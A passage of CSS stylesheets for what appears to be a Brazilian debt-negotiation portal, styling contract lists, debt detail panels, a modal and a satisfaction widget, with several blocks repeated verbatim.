         margin-bottom: 20.5px;
         font-size: 32px; }
         .modal.modal__divida-inegociavel .textfield__label {
         left: 10px; }
         .modal.modal__divida-inegociavel .textfield__input.textfield--without-icon {
         padding-left: 10px; }
         .modal.modal__divida-inegociavel p {
         font-size: 13px;
         font-weight: 400; }
         .modal.modal__divida-inegociavel .escolha-horario-box {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .modal.modal__divida-inegociavel .escolha-horario-box .texto-horario {
         margin-right: 10px;
         padding-top: 16px; }
         .modal.modal__divida-inegociavel .escolha-horario-box .texto-horario-final {
         margin-left: 10px; }
         @media (max-width: 767px) {
         .modal.modal__divida-inegociavel {
         padding: 20px; } }
      </style>
      <style type="text/css">@media (min-width: 768px) and (max-width: 1023px) {
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 {
         padding: 10px 25px; }
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 hr {
         margin: 0;
         margin-bottom: 4px;
         border-color: #e0e0e0; }
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 .row-superior {
         padding: 0 10px; }
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 .row-inferior {
         margin-bottom: 10px; }
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 .row-inferior .detalhe-contrato--item.medium-2 .property__label,
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 .row-inferior .detalhe-contrato--item.medium-2 .property__value {
         font-size: 10px; }
         .detalhe-contrato .item-parcela {
         display: -webkit-box;
         display: flex;
         padding-top: 5px; }
         .detalhe-contrato .item-parcela p {
         margin-bottom: 0;
         color: #acacac;
         font-size: 10px; }
         .detalhe-contrato .item-parcela .item-destacado {
         margin-left: 4px;
         color: #706f6f;
         font-weight: bold; }
         .detalhe-contrato .div-tag-label {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: end;
         justify-content: flex-end; }
         .detalhe-contrato .div-tag-label .item-tag-label {
         padding-bottom: 5px; }
         .detalhe-contrato .div-tag-label .item-tag-label span {
         font-size: 10px; } }
         .detalhe-contrato .detalhe-contrato__info {
         margin: 0;
         border: 1px solid #e0e0e0;
         border-top: 0;
         padding: 15px 20px; }
         .detalhe-contrato .detalhe-contrato__info .table-contrato {
         table-layout: fixed;
         border-collapse: collapse; }
         .detalhe-contrato .detalhe-contrato__info .table-contrato thead .detalhe-contrato--item {
         padding-top: 5px;
         padding-bottom: 10px; }
         .detalhe-contrato .detalhe-contrato__info .table-contrato .table-contrato__row .detalhe-contrato--item {
         border-top: 1px solid #e0e0e0;
         padding: 10px 0;
         font-weight: bold; }
         .detalhe-contrato .detalhe-contrato__info .detalhe-contrato--item {
         margin: 0;
         text-align: center;
         color: #706f6f;
         font-size: 12px;
         font-weight: normal; }
         @media (max-width: 767px) {
         .detalhe-contrato {
         border: 1px solid #e0e0e0;
         border-top: 0;
         padding: 10px 0; }
         .detalhe-contrato .row {
         margin: 0; }
         .detalhe-contrato .detalhe-contrato__info {
         margin: 0 5px;
         border: 1px solid #e0e0e0;
         background-color: #f2f2f2;
         padding: 10px; }
         .detalhe-contrato .detalhe-contrato__info .property__label,
         .detalhe-contrato .detalhe-contrato__info .property__value,
         .detalhe-contrato .detalhe-contrato__info .detalhe-contrato__item {
         color: #1e1e1f;
         font-size: 12px; }
         .detalhe-contrato .detalhe-contrato__info .detalhe-contrato__item--atraso .property .property__value {
         color: #cf3e3e; }
         .detalhe-contrato .detalhe-contrato__info .row-intermediaria {
         -webkit-box-pack: center;
         justify-content: center;
         margin: 10px 0;
         text-align: center; }
         .detalhe-contrato .detalhe-contrato__info .row-intermediaria .detalhe-contrato__item .property .property__value {
         font-size: 16px; }
         .detalhe-contrato .detalhe-contrato__info .row-inferior {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .detalhe-contrato .detalhe-contrato__info .row-inferior .detalhe-contrato__item .property {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .detalhe-contrato .detalhe-contrato__info .row-inferior .detalhe-contrato__item .property .property__label {
         line-height: inherit; }
         .detalhe-contrato .detalhe-contrato__carousel {
         height: 210px; }
         .detalhe-contrato .detalhe-contrato__carousel slidecontainer {
         left: 10%;
         width: 80%; }
         .detalhe-contrato .detalhe-contrato__carousel slide {
         -webkit-transition: -webkit-transform 0.25s ease;
         transition: -webkit-transform 0.25s ease;
         transition: transform 0.25s ease;
         transition: transform 0.25s ease, -webkit-transform 0.25s ease; }
         .detalhe-contrato .detalhe-contrato__carousel slide:not(.carousel-active) {
         -webkit-transform: scale(0.95);
         transform: scale(0.95); }
         .detalhe-contrato .detalhe-contrato__carousel slide.empty {
         margin-left: -10%; }
         .detalhe-contrato .detalhe-contrato__carousel slide.empty {
         margin-right: 10%; }
         .detalhe-contrato .detalhe-contrato__carousel-dots {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center;
         list-style: none; }
         .detalhe-contrato .detalhe-contrato__carousel-dots .carousel-dot {
         -webkit-transition: background-color 0.25s ease;
         transition: background-color 0.25s ease;
         margin-right: 5px;
         outline: none;
         border-radius: 50%;
         background-color: #f2f2f2;
         width: 8px;
         height: 8px; }
         .detalhe-contrato .detalhe-contrato__carousel-dots .carousel-dot.carousel-active {
         background-color: #acacac; }
         .detalhe-contrato .detalhe-contrato__carousel-dots .carousel-dot:last-child {
         margin-right: 0; } }
         @media (max-width: 1023px) {
         .lista-contrato .block__header .label-em-atraso {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center; }
         .lista-contrato .block__header .item-header {
         -webkit-box-align: start;
         align-items: flex-start;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .lista-contrato .block__header .item-header p.titulo {
         line-height: 11px;
         font-size: 11px; } }
         @media (max-width: 767px) {
         .lista-contrato div.block__header {
         background-color: #fff; }
         .lista-contrato div.block__header .item-header p.titulo {
         line-height: 11px;
         font-size: 10px; }
         .lista-contrato div.block__header .toggle-contrato.toggle-ativo {
         -webkit-transform: rotate(225deg);
         transform: rotate(225deg); }
         .lista-contrato div.block__header .toggle-contrato {
         display: block;
         -webkit-transform: rotate(45deg);
         transform: rotate(45deg);
         border-right: 1px solid #1e1e1f;
         border-bottom: 1px solid #1e1e1f;
         width: 10px;
         height: 10px; }
         .lista-contrato div.block__header .item-header.item--total-contrato .valor,
         .lista-contrato div.block__header .item-header.item--numero-contrato .valor {
         font-size: 12px; }
         .lista-contrato div.block__header .item-header.item-header.item--total-contrato {
         padding-left: 8px; }
         .lista-contrato div.block__header .label-em-atraso {
         -webkit-box-pack: start;
         justify-content: flex-start;
         -webkit-box-ordinal-group: 2;
         order: 1; }
         .lista-contrato div.block__header .label-em-atraso .tag-label {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin: 0;
         padding: 0 3px;
         height: 16px;
         font-size: 10px; }
         .lista-contrato div.block__header .button--item {
         -webkit-box-ordinal-group: 3;
         order: 2; } }
         .lista-contrato .item-header {
         -webkit-box-align: center;
         align-items: center; }
         .lista-contrato .item-header .wrapper {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .lista-contrato .item-header .wrapper icon-cartao {
         margin-right: 5px; }
         .lista-contrato .item-header.item--total-contrato .valor.em-atraso {
         color: #cf3e3e; }
         .lista-contrato .block__header {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin-bottom: 0;
         border: 1px solid #e0e0e0;
         background-color: #f2f2f2;
         padding: 0 20px;
         height: 55px; }
         .lista-contrato .block__header .button--item {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center; }
         .lista-contrato .block__header .block__header--end {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: end;
         justify-content: flex-end; }
         .lista-contrato .block__header .block__header--end .button.button--small {
         font-size: 12px; }
         .lista-contrato .block__header .item-header {
         display: -webkit-box;
         display: flex; }
         .lista-contrato .block__header .item-header.item--numero-contrato .titulo {
         margin-right: 10px; }
         .lista-contrato .block__header .item-header.item--total-contrato .titulo {
         margin-right: 10px; }
         .lista-contrato .block__header .item-header .titulo,
         .lista-contrato .block__header .item-header .valor {
         margin: 0; }
         .lista-contrato .block__header .item-header .titulo {
         color: #acacac;
         font-size: 12px; }
         .lista-contrato .block__header .item-header .valor {
         color: #1e1e1f;
         font-size: 14px;
         font-weight: bold; }
         @media (max-width: 767px) {
         .detalhe-divida div.loader-contratos div.loader__bubble {
         margin-top: 25px; }
         .detalhe-divida p.detalhe-divida__descricao {
         font-size: 14px; }
         .detalhe-divida h1.detalhe-divida__titulo.titulo__superior {
         margin-top: 22px; }
         .detalhe-divida p.detalhe-divida__descricao.descricao__superior {
         margin-bottom: 15px; }
         .detalhe-divida p.detalhe-divida__descricao.descricao__inferior {
         line-height: 22px; }
         .detalhe-divida h1.detalhe-divida__titulo.titulo__inferior {
         margin-top: 10px; }
         .detalhe-divida .dias-atraso-column .detalhe-divida--item,
         .detalhe-divida .total-atualizado-column .detalhe-divida--item {
         border: 1px solid #e0e0e0;
         border-top: 0;
         border-right: 0;
         padding: 10px;
         height: 100%; }
         .detalhe-divida .dias-atraso-column .detalhe-divida--item .property .property__label,
         .detalhe-divida .total-atualizado-column .detalhe-divida--item .property .property__label {
         line-height: 11px;
         font-size: 9px; }
         .detalhe-divida .dias-atraso-column .detalhe-divida--item .property .property__value,
         .detalhe-divida .total-atualizado-column .detalhe-divida--item .property .property__value {
         font-size: 14px; }
         .detalhe-divida .dias-atraso-column .detalhe-divida--item .property .property__icon,
         .detalhe-divida .total-atualizado-column .detalhe-divida--item .property .property__icon {
         margin-right: 10px; }
         .detalhe-divida .dias-atraso-column .detalhe-divida--item .property__total-atualizado .property__icon,
         .detalhe-divida .total-atualizado-column .detalhe-divida--item .property__total-atualizado .property__icon {
         margin-right: 5px; }
         .detalhe-divida .loader__simular,
         .detalhe-divida .loader__simular button {
         width: 100%; }
         .detalhe-divida div.lista-contrato {
         margin-bottom: 10px;
         box-shadow: 0 3px 4px rgba(242, 242, 242, 0.8); } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .detalhe-divida p.detalhe-divida__descricao {
         font-size: 14px; }
         .detalhe-divida p.descricao__superior.detalhe-divida__descricao {
         margin-bottom: 15px; }
         .detalhe-divida .detalhe-divida__info {
         margin-bottom: 30px; }
         .detalhe-divida .detalhe-divida--item .property .property__label {
         line-height: 11px;
         font-size: 11px; } }
         .detalhe-divida .origem-divida {
         border-top: none;
         border-right: none;
         border-left: none; }
         .detalhe-divida .loader-contratos .loader__bubble {
         margin-top: 50px; }
         .detalhe-divida .row,
         .detalhe-divida .column {
         margin: 0;
         padding: 0; }
         .detalhe-divida .panel__cell {
         border-radius: 0; }
         .detalhe-divida .detalhe-divida__titulo {
         margin: 0;
         line-height: 1;
         font-size: 22px;
         font-weight: 300; }
         .detalhe-divida .detalhe-divida__descricao {
         margin-top: 15px;
         margin-bottom: 25px;
         font-size: 18px;
         font-weight: 300; }
         .detalhe-divida .detalhe-divida__info {
         padding: 0; }
         .detalhe-divida .detalhe-divida__info .total-atualizado-column {
         padding-left: 0; }
         .detalhe-divida .detalhe-divida__info .dias-atraso-column {
         padding-right: 0; }
         .detalhe-divida .detalhe-divida__info .property__label {
         font-size: 12px; }
         .detalhe-divida .detalhe-divida__info .property__value {
         font-size: 18px; }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--item .property__dias-atraso .property__value {
         color: #cf3e3e; }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--itens-maiores {
         border-right: 1px solid #e0e0e0; }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--itens-maiores .column {
         padding-right: 0;
         height: 100%; }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--itens-maiores .detalhe-divida--item {
         display: -webkit-box;
         display: flex;
         position: relative;
         -webkit-box-align: center;
         align-items: center;
         padding-top: 12px;
         padding-left: 23px;
         height: 50%; }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--itens-maiores .detalhe-divida__dias-atraso {
         border-bottom: 1px solid #e0e0e0; }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores {
         padding: 5px 15px; }
         @media (max-width: 767px) {
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .lista-encargos.invisible {
         display: none; } }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores hr {
         margin: 7px 0 3px; }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .toggle-encargos.toggle-ativo {
         right: 18px;
         -webkit-transform: rotate(225deg) translateY(-3px);
         transform: rotate(225deg) translateY(-3px); }
         @media (max-width: 767px) {
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .toggle-encargos.toggle-ativo {
         right: 14px; } }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .toggle-encargos {
         display: block;
         position: absolute;
         right: 22px;
         -webkit-transform: rotate(45deg) translateY(-3px);
         transform: rotate(45deg) translateY(-3px);
         border-right: 2px solid #1e1e1f;
         border-bottom: 2px solid #1e1e1f;
         cursor: pointer;
         width: 10px;
         height: 10px; }
         @media (max-width: 767px) {
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .toggle-encargos {
         right: 18px; } }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .lista-encargos {
         background: #f2f2f2;
         padding: 5px 21px 5px 12px; }
         @media (min-width: 768px) {
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .lista-encargos {
         margin-right: 15px; } }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .lista-encargos .detalhe-divida--item .item-valor {
         margin: 4.5px 0; }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .detalhe-divida--item {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .detalhe-divida--item .item-titulo {
         -webkit-box-flex: 1;
         flex: 1; }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .detalhe-divida--item .item-valor {
         -webkit-box-flex: 0;
         flex: 0 auto; }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .detalhe-divida--item .item-titulo {
         margin: 0;
         color: #706f6f;
         font-size: 12px; }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .detalhe-divida--item .item-valor {
         margin: 4.5px 35px 4.5px 0;
         text-align: right;
         font-size: 13px;
         font-weight: bold; }
         @media (max-width: 767px) {
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .detalhe-divida--item .item-valor {
         margin-right: 20px; } }
         .detalhe-divida .detalhe-divida__info .detalhe-divida--info-valores .detalhe-divida--item .item-valor--destacado {
         color: #cf3e3e; }
         .detalhe-divida .detalhe-divida__contratos {
         display: block;
         min-height: 100px; }
         .detalhe-divida .detalhe-divida__rodape {
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin-top: 20px; }
         @media (max-width: 767px) {
         .detalhe-divida .detalhe-divida__rodape {
         -webkit-box-pack: start;
         justify-content: start; } }
         .detalhe-divida .detalhe-divida__rodape .button {
         padding: 0 20px;
         min-width: 140px; }
      </style>
      <style type="text/css">@media (min-width: 768px) and (max-width: 1023px) {
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 {
         padding: 10px 25px; }
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 hr {
         margin: 0;
         margin-bottom: 4px;
         border-color: #e0e0e0; }
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 .row-superior {
         padding: 0 10px; }
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 .row-inferior {
         margin-bottom: 10px; }
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 .row-inferior .detalhe-contrato--item.medium-2 .property__label,
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 .row-inferior .detalhe-contrato--item.medium-2 .property__value {
         font-size: 10px; }
         .detalhe-contrato .item-parcela {
         display: -webkit-box;
         display: flex;
         padding-top: 5px; }
         .detalhe-contrato .item-parcela p {
         margin-bottom: 0;
         color: #acacac;
         font-size: 10px; }
         .detalhe-contrato .item-parcela .item-destacado {
         margin-left: 4px;
         color: #706f6f;
         font-weight: bold; }
         .detalhe-contrato .div-tag-label {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: end;
         justify-content: flex-end; }
         .detalhe-contrato .div-tag-label .item-tag-label {
         padding-bottom: 5px; }
         .detalhe-contrato .div-tag-label .item-tag-label span {
         font-size: 10px; } }
         .detalhe-contrato .detalhe-contrato__info {
         margin: 0;
         border: 1px solid #e0e0e0;
         border-top: 0;
         padding: 15px 20px; }
         .detalhe-contrato .detalhe-contrato__info .table-contrato {
         table-layout: fixed;
         border-collapse: collapse; }
         .detalhe-contrato .detalhe-contrato__info .table-contrato thead .detalhe-contrato--item {
         padding-top: 5px;
         padding-bottom: 10px; }
         .detalhe-contrato .detalhe-contrato__info .table-contrato .table-contrato__row .detalhe-contrato--item {
         border-top: 1px solid #e0e0e0;
         padding: 10px 0;
         font-weight: bold; }
         .detalhe-contrato .detalhe-contrato__info .detalhe-contrato--item {
         margin: 0;
         text-align: center;
         color: #706f6f;
         font-size: 12px;
         font-weight: normal; }
         @media (max-width: 767px) {
         .detalhe-contrato {
         border: 1px solid #e0e0e0;
         border-top: 0;
         padding: 10px 0; }
         .detalhe-contrato .row {
         margin: 0; }
         .detalhe-contrato .detalhe-contrato__info {
         margin: 0 5px;
         border: 1px solid #e0e0e0;
         background-color: #f2f2f2;
         padding: 10px; }
         .detalhe-contrato .detalhe-contrato__info .property__label,
         .detalhe-contrato .detalhe-contrato__info .property__value,
         .detalhe-contrato .detalhe-contrato__info .detalhe-contrato__item {
         color: #1e1e1f;
         font-size: 12px; }
         .detalhe-contrato .detalhe-contrato__info .detalhe-contrato__item--atraso .property .property__value {
         color: #cf3e3e; }
         .detalhe-contrato .detalhe-contrato__info .row-intermediaria {
         -webkit-box-pack: center;
         justify-content: center;
         margin: 10px 0;
         text-align: center; }
         .detalhe-contrato .detalhe-contrato__info .row-intermediaria .detalhe-contrato__item .property .property__value {
         font-size: 16px; }
         .detalhe-contrato .detalhe-contrato__info .row-inferior {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .detalhe-contrato .detalhe-contrato__info .row-inferior .detalhe-contrato__item .property {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .detalhe-contrato .detalhe-contrato__info .row-inferior .detalhe-contrato__item .property .property__label {
         line-height: inherit; }
         .detalhe-contrato .detalhe-contrato__carousel {
         height: 210px; }
         .detalhe-contrato .detalhe-contrato__carousel slidecontainer {
         left: 10%;
         width: 80%; }
         .detalhe-contrato .detalhe-contrato__carousel slide {
         -webkit-transition: -webkit-transform 0.25s ease;
         transition: -webkit-transform 0.25s ease;
         transition: transform 0.25s ease;
         transition: transform 0.25s ease, -webkit-transform 0.25s ease; }
         .detalhe-contrato .detalhe-contrato__carousel slide:not(.carousel-active) {
         -webkit-transform: scale(0.95);
         transform: scale(0.95); }
         .detalhe-contrato .detalhe-contrato__carousel slide.empty {
         margin-left: -10%; }
         .detalhe-contrato .detalhe-contrato__carousel slide.empty {
         margin-right: 10%; }
         .detalhe-contrato .detalhe-contrato__carousel-dots {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center;
         list-style: none; }
         .detalhe-contrato .detalhe-contrato__carousel-dots .carousel-dot {
         -webkit-transition: background-color 0.25s ease;
         transition: background-color 0.25s ease;
         margin-right: 5px;
         outline: none;
         border-radius: 50%;
         background-color: #f2f2f2;
         width: 8px;
         height: 8px; }
         .detalhe-contrato .detalhe-contrato__carousel-dots .carousel-dot.carousel-active {
         background-color: #acacac; }
         .detalhe-contrato .detalhe-contrato__carousel-dots .carousel-dot:last-child {
         margin-right: 0; } }
      </style>
      <style type="text/css">@media (min-width: 768px) and (max-width: 1023px) {
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 {
         padding: 10px 25px; }
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 hr {
         margin: 0;
         margin-bottom: 4px;
         border-color: #e0e0e0; }
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 .row-superior {
         padding: 0 10px; }
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 .row-inferior {
         margin-bottom: 10px; }
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 .row-inferior .detalhe-contrato--item.medium-2 .property__label,
         .detalhe-contrato .detalhe-contrato__info.panel__cell.medium-12 .row-inferior .detalhe-contrato--item.medium-2 .property__value {
         font-size: 10px; }
         .detalhe-contrato .item-parcela {
         display: -webkit-box;
         display: flex;
         padding-top: 5px; }
         .detalhe-contrato .item-parcela p {
         margin-bottom: 0;
         color: #acacac;
         font-size: 10px; }
         .detalhe-contrato .item-parcela .item-destacado {
         margin-left: 4px;
         color: #706f6f;
         font-weight: bold; }
         .detalhe-contrato .div-tag-label {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: end;
         justify-content: flex-end; }
         .detalhe-contrato .div-tag-label .item-tag-label {
         padding-bottom: 5px; }
         .detalhe-contrato .div-tag-label .item-tag-label span {
         font-size: 10px; } }
         .detalhe-contrato .detalhe-contrato__info {
         margin: 0;
         border: 1px solid #e0e0e0;
         border-top: 0;
         padding: 15px 20px; }
         .detalhe-contrato .detalhe-contrato__info .table-contrato {
         table-layout: fixed;
         border-collapse: collapse; }
         .detalhe-contrato .detalhe-contrato__info .table-contrato thead .detalhe-contrato--item {
         padding-top: 5px;
         padding-bottom: 10px; }
         .detalhe-contrato .detalhe-contrato__info .table-contrato .table-contrato__row .detalhe-contrato--item {
         border-top: 1px solid #e0e0e0;
         padding: 10px 0;
         font-weight: bold; }
         .detalhe-contrato .detalhe-contrato__info .detalhe-contrato--item {
         margin: 0;
         text-align: center;
         color: #706f6f;
         font-size: 12px;
         font-weight: normal; }
         @media (max-width: 767px) {
         .detalhe-contrato {
         border: 1px solid #e0e0e0;
         border-top: 0;
         padding: 10px 0; }
         .detalhe-contrato .row {
         margin: 0; }
         .detalhe-contrato .detalhe-contrato__info {
         margin: 0 5px;
         border: 1px solid #e0e0e0;
         background-color: #f2f2f2;
         padding: 10px; }
         .detalhe-contrato .detalhe-contrato__info .property__label,
         .detalhe-contrato .detalhe-contrato__info .property__value,
         .detalhe-contrato .detalhe-contrato__info .detalhe-contrato__item {
         color: #1e1e1f;
         font-size: 12px; }
         .detalhe-contrato .detalhe-contrato__info .detalhe-contrato__item--atraso .property .property__value {
         color: #cf3e3e; }
         .detalhe-contrato .detalhe-contrato__info .row-intermediaria {
         -webkit-box-pack: center;
         justify-content: center;
         margin: 10px 0;
         text-align: center; }
         .detalhe-contrato .detalhe-contrato__info .row-intermediaria .detalhe-contrato__item .property .property__value {
         font-size: 16px; }
         .detalhe-contrato .detalhe-contrato__info .row-inferior {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .detalhe-contrato .detalhe-contrato__info .row-inferior .detalhe-contrato__item .property {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .detalhe-contrato .detalhe-contrato__info .row-inferior .detalhe-contrato__item .property .property__label {
         line-height: inherit; }
         .detalhe-contrato .detalhe-contrato__carousel {
         height: 210px; }
         .detalhe-contrato .detalhe-contrato__carousel slidecontainer {
         left: 10%;
         width: 80%; }
         .detalhe-contrato .detalhe-contrato__carousel slide {
         -webkit-transition: -webkit-transform 0.25s ease;
         transition: -webkit-transform 0.25s ease;
         transition: transform 0.25s ease;
         transition: transform 0.25s ease, -webkit-transform 0.25s ease; }
         .detalhe-contrato .detalhe-contrato__carousel slide:not(.carousel-active) {
         -webkit-transform: scale(0.95);
         transform: scale(0.95); }
         .detalhe-contrato .detalhe-contrato__carousel slide.empty {
         margin-left: -10%; }
         .detalhe-contrato .detalhe-contrato__carousel slide.empty {
         margin-right: 10%; }
         .detalhe-contrato .detalhe-contrato__carousel-dots {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center;
         list-style: none; }
         .detalhe-contrato .detalhe-contrato__carousel-dots .carousel-dot {
         -webkit-transition: background-color 0.25s ease;
         transition: background-color 0.25s ease;
         margin-right: 5px;
         outline: none;
         border-radius: 50%;
         background-color: #f2f2f2;
         width: 8px;
         height: 8px; }
         .detalhe-contrato .detalhe-contrato__carousel-dots .carousel-dot.carousel-active {
         background-color: #acacac; }
         .detalhe-contrato .detalhe-contrato__carousel-dots .carousel-dot:last-child {
         margin-right: 0; } }
         @media (max-width: 1023px) {
         .lista-contrato .block__header .label-em-atraso {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center; }
         .lista-contrato .block__header .item-header {
         -webkit-box-align: start;
         align-items: flex-start;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .lista-contrato .block__header .item-header p.titulo {
         line-height: 11px;
         font-size: 11px; } }
         @media (max-width: 767px) {
         .lista-contrato div.block__header {
         background-color: #fff; }
         .lista-contrato div.block__header .item-header p.titulo {
         line-height: 11px;
         font-size: 10px; }
         .lista-contrato div.block__header .toggle-contrato.toggle-ativo {
         -webkit-transform: rotate(225deg);
         transform: rotate(225deg); }
         .lista-contrato div.block__header .toggle-contrato {
         display: block;
         -webkit-transform: rotate(45deg);
         transform: rotate(45deg);
         border-right: 1px solid #1e1e1f;
         border-bottom: 1px solid #1e1e1f;
         width: 10px;
         height: 10px; }
         .lista-contrato div.block__header .item-header.item--total-contrato .valor,
         .lista-contrato div.block__header .item-header.item--numero-contrato .valor {
         font-size: 12px; }
         .lista-contrato div.block__header .item-header.item-header.item--total-contrato {
         padding-left: 8px; }
         .lista-contrato div.block__header .label-em-atraso {
         -webkit-box-pack: start;
         justify-content: flex-start;
         -webkit-box-ordinal-group: 2;
         order: 1; }
         .lista-contrato div.block__header .label-em-atraso .tag-label {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin: 0;
         padding: 0 3px;
         height: 16px;
         font-size: 10px; }
         .lista-contrato div.block__header .button--item {
         -webkit-box-ordinal-group: 3;
         order: 2; } }
         .lista-contrato .item-header {
         -webkit-box-align: center;
         align-items: center; }
         .lista-contrato .item-header .wrapper {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .lista-contrato .item-header .wrapper icon-cartao {
         margin-right: 5px; }
         .lista-contrato .item-header.item--total-contrato .valor.em-atraso {
         color: #cf3e3e; }
         .lista-contrato .block__header {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin-bottom: 0;
         border: 1px solid #e0e0e0;
         background-color: #f2f2f2;
         padding: 0 20px;
         height: 55px; }
         .lista-contrato .block__header .button--item {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center; }
         .lista-contrato .block__header .block__header--end {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: end;
         justify-content: flex-end; }
         .lista-contrato .block__header .block__header--end .button.button--small {
         font-size: 12px; }
         .lista-contrato .block__header .item-header {
         display: -webkit-box;
         display: flex; }
         .lista-contrato .block__header .item-header.item--numero-contrato .titulo {
         margin-right: 10px; }
         .lista-contrato .block__header .item-header.item--total-contrato .titulo {
         margin-right: 10px; }
         .lista-contrato .block__header .item-header .titulo,
         .lista-contrato .block__header .item-header .valor {
         margin: 0; }
         .lista-contrato .block__header .item-header .titulo {
         color: #acacac;
         font-size: 12px; }
         .lista-contrato .block__header .item-header .valor {
         color: #1e1e1f;
         font-size: 14px;
         font-weight: bold; }
      </style>
      <style type="text/css">.encantometro-portal {
         border: 1px solid #e0e0e0;
         border-radius: 3px;
         padding: 20px; }
         .encantometro-portal .enviado {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .encantometro-portal .enviado .button {
         width: 160px; }
         .encantometro-portal .enviado p {
         margin: 15px 0 20px;
         color: #1e1e1f;
         font-size: 16px;
         font-weight: normal; }
         .encantometro-portal .enviado .icon-holder {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .encantometro-portal .enviado .icon-holder .icon {
         margin-right: 12px;
         width: 21px;
         height: 21px; }
         .encantometro-portal .enviado .header-text {
         margin: 0;
         font-size: 18px; }
         .encantometro-portal .enviado.enviado--sucesso .header-text,
         .encantometro-portal .enviado.enviado--sucesso .icon {
         color: #3ecf7a; }
         .encantometro-portal .enviado.enviado--erro .header-text,
         .encantometro-portal .enviado.enviado--erro .icon {
         color: #cf3e3e; }
         .encantometro-portal .titulo {
         margin: 0;
         font-size: 16px;
         font-weight: 700; }
         .encantometro-portal .flex-holder {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin-top: 16px; }
         .encantometro-portal .flex-holder .card.ativo {
         box-shadow: 0 0 6px 0 #acacac; }
         .encantometro-portal .flex-holder .card.ativo.card--muito-satisfeito .icon svg * {
         stroke: #3ecf7a; }
